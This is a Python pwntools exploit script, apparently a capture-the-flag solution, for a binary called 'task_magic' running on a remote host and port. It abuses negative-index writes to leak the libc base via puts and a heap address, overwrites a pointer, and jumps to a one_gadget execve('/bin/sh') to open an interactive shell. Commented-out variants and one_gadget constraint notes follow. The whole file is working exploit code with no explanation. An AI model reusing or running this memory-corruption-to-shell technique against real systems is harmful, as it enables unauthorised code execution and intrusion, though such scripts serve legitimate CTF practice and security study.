# coding:utf-8
from pwn import *
debug=0
#context.log_level='debug'
elf = ELF('./task_magic')
libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
if debug:
    p = process('./task_magic',env={'LD_PRELOAD':'/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so'})
#    libc=ELF('/home/moonagirl/moonagirl/libc/libc_local_x64')
#    gdb.attach(p)
else:
    p = remote('49.4.23.164', 32232)#  49.4.23.164 32232
    libc = ELF('/home/moonagirl/moonagirl/libc/libc6_2.23-0ubuntu10_amd64.so')
#    one_gadgets = [0x3a80c,0x3a80e,0x3a812,0x3a819,0x5f065,0x5f066]

def z(a=''):
    gdb.attach(p,a)
    if a == '':
        raw_input()

def create(name):
    p.send('1\n')
    p.recvuntil('Give me the wizard\'s name:')
    p.send(name)
    p.recvuntil('choice>>')

def spell(idx,name):
    p.send('2\n')
    p.recvuntil('Who will spell:')
    p.send(str(idx))
    p.recvuntil('Spell name:')
    p.send(name)
    return p.recvuntil('choice>>')

def final_chance(idx):
    p.send('3\n')
    p.recvuntil('Who got the final_chance:')
    p.sendline(str(idx))
    p.recvuntil('choice>> ')


create('1')
spell(0,'a')
for i in range(13):
    spell(-2,'\x00\x00\x00\x00')
spell(-2,'\x00\x00\xe0')

data=spell(0,'\xa8'+p64(0x602020))
puts=u64(data[:8])
base=puts-libc.symbols['puts']
success('base:'+hex(base))
p.send('3\n')
p.recvuntil('Who got the chance:')
p.sendline(str(-2))
p.recvuntil('choice>> ')

for i in range(5):
    spell(0,'\x00'*8)

heap=u64(spell(0,'\x00'*8)[:8])-0x10

for i in range(3):
    spell(-2,'\x00')
for i in range(9):
    spell(-2,'\x00'*10)
spell(-2,'\x00'*2)

chunk_addr=heap + 0x12f0
create('a'*16+p64(base+0x07CD01))
#create('a'*16+p64(0xdeadbeef))
pause()
p.send('2\n')
p.recvuntil('Who will spell:')
p.send(str(0))
p.recvuntil('Spell name:')
p.send('/bin/sh\x00' + p64(chunk_addr - 0x30)+p64(base + 0xf02a4))

p.interactive()

# create('1')
# spell(0,'a')

# for i in range(14):
#     spell(-2,'\x00\x00\x00\x00')
# #spell(-2,'\x00\x00\xe0')

# data=spell(0,'\xa8'+p64(0x602020))
# puts=u64(data[:8])
# libc_base = puts-libc.symbols['puts']

# final_chance(-2)

# for i in range(5):
#     spell(0,'\x00'*8)

# heap_addr = u64(spell(0,'\x00'*8)[:8]) - 0x10

# for i in range(3):
#     spell(-2,'\x00')
# for i in range(9):
#     spell(-2,'\x00'*10)
# spell(-2,'\x00'*2)

# chunk_addr = heap_addr + 0x12f0
# create('a'*16+p64(libc_base + 0x7CE5B))

# p.send('2\n')
# p.recvuntil('Who will spell:')
# p.send(str(0))
# p.recvuntil('Spell name:')
# p.send('/bin/sh\x00' + p64(chunk_addr - 0x30)+p64(libc_base + 0xf02a4))

# p.interactive()

# 0x45216	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   rax == NULL

# 0x4526a	execve("/bin/sh", rsp+0x30, environ)
# constraints:
#   [rsp+0x30] == NULL

# 0xf02a4	execve("/bin/sh", rsp+0x50, environ)
# constraints:
#   [rsp+0x50] == NULL

# 0xf1147	execve("/bin/sh", rsp+0x70, environ)
# constraints:
#   [rsp+0x70] == NULL


# create('1')
# spell(0,'a')
# for i in range(13):
#     spell(-2,'\x00\x00\x00\x00')
# spell(-2,'\x00\x00\xe0')

# data=spell(0,'\xa8'+p64(0x602020))
# puts=u64(data[:8])
# base=puts-e.symbols['puts']

# malloc_hook=base+e.symbols['__malloc_hook']
# vtable=base+e.symbols['_IO_file_jumps']+0xc0-8

# one_gadget=base+0xf02a4
# system=base+e.symbols['system']

# chance(-2)

# for i in range(5):
#     spell(0,'\x00'*8)

# heap=u64(spell(0,'\x00'*8)[:8])-0x10

# for i in range(3):
#     spell(-2,'\x00')
# for i in range(9):
#     spell(-2,'\x00'*10)
# spell(-2,'\x00'*2)

# chunk=heap+0x12f0
# create('a'*16+p64(base+0x7CE5B))
# #create('a'*16+p64(0xdeadbeef))
# spell(0,'/bin/sh\x00'+p64(chunk-0x30)+p64(base+0xf02a4),False,False)

# p.interactive()
